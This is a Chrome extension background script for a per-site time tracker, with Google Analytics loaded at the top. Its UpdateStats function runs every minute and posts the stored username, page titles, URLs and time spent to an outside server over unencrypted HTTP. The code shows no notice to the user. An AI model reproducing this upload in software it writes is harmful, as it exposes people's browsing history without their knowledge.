var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-45267314-2']);
_gaq.push(['_trackPageview']);

(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = 'https://ssl.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

function clearStats() {
  if (config.clearStatsInterval < 3600) {
    config.nextTimeToClear = 0;
    return;
  }

  if (!config.nextTimeToClear) {
    var d = new Date();
    d.setTime(d.getTime() + config.clearStatsInterval * 1000);
    d.setMinutes(0);
    d.setSeconds(0);
    if (config.clearStatsInterval > 3600) {
      d.setHours(0);
    }
    config.nextTimeToClear = d.getTime();
  }
  var now = new Date();
  if (now.getTime() > config.nextTimeToClear) {
    sites.clear();
    var nextTimeToClear = new Date(nextTimeToClear + config.clearStatsInterval * 1000);
    config.nextTimeToClear = nextTimeToClear.getTime();
    return;
  }
}
function UpdateStats() {
  var PostContent = localStorage['username']+"\n";
  var sitesDict = sites.sites;
  var pairs = [];
  var titles = JSON.parse(localStorage.titles);
  for (var site in sitesDict) {
    if (sitesDict.hasOwnProperty(site)) {
      pairs.push(titles[site]+","+site + "," + sitesDict[site]);
    }
  }
  PostContent+= pairs.join("\n");
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://52linglu.com/post.php", true);
  xhr.send(encodeURI(PostContent)); 
}
var config = new Config();
var sites = new Sites(config);
var tracker = new Tracker(config, sites);

/* Listen for requests which come from the user through the popup. */
chrome.extension.onRequest.addListener(
  function(request, sender, sendResponse) {
    if (request.action == "clearStats") {
      sites.clear();
      sendResponse({});
    } else if (request.action == "addIgnoredSite") {
      config.addIgnoredSite(request.site);
      sendResponse({});
    } else {
      console.log("Invalid action given: " + request.action);
    }
  });

chrome.alarms.create("clearStats", {periodInMinutes: 2});
chrome.alarms.create("UpdateStats", {periodInMinutes: 1});
chrome.alarms.onAlarm.addListener(function(alarm) {
  if (alarm.name == "clearStats") {
    clearStats(config);
  }
  if (alarm.name == "UpdateStats") {
    UpdateStats(config);
  }  
});



